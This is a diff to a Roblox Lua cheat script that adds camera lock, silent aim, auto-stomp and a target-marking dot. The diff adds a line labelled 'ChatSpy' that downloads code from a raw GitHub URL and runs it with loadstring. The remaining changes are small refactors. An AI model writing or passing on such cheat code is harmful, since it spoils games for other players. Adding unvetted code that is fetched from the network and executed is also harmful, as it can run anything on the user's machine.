@@ -43,6 +43,9 @@ dot.Thickness = 1
 dot.Radius = 3
 dot.Color = Color3.fromRGB(175,30,0)
 
+--// ChatSpy \\--
+loadstring(game:HttpGet("https://raw.githubusercontent.com/3isht/3isht/master/chatspy"))()
+
 function autostomp()
     if not settings["AutoStomp"] then return end
     repeat
@@ -154,7 +157,7 @@ function resolve(name)
 end
 
 function camlock()
-    spawn(function()
+    task.spawn(function()
         local noob = game.Players[settings["Target"]]
         local calculation, mag, goal
         local type = cc.CameraType
@@ -219,7 +222,7 @@ function camlock()
 end
 
 function silentlock()
-    spawn(function()
+    task.spawn(function()
         settings["SilentVictim"] = getnear()
         local calculation, mag, goal
         local type = cc.CameraType
@@ -340,9 +343,9 @@ rs.Heartbeat:Connect(function()
         fireclickdetector(tac.ClickDetector)
     end
     -- Update Dot: Still Fixing.
-    if settings["Dot"] and settings["Target"] ~= me.Name then
+    if settings["Dot"] and game.Players[settings["Target"]] then
         local pos, onscreen = cc:WorldToViewportPoint(game.Players[settings["Target"]].Character[settings["Aimpart"]].Position)
-        if onscreen and pos ~= mypos and game.Players[settings["Target"]] then
+        if onscreen then
             dot.Visible = true
             dot.Position = Vector2.new(pos.X, pos.Y)
         else
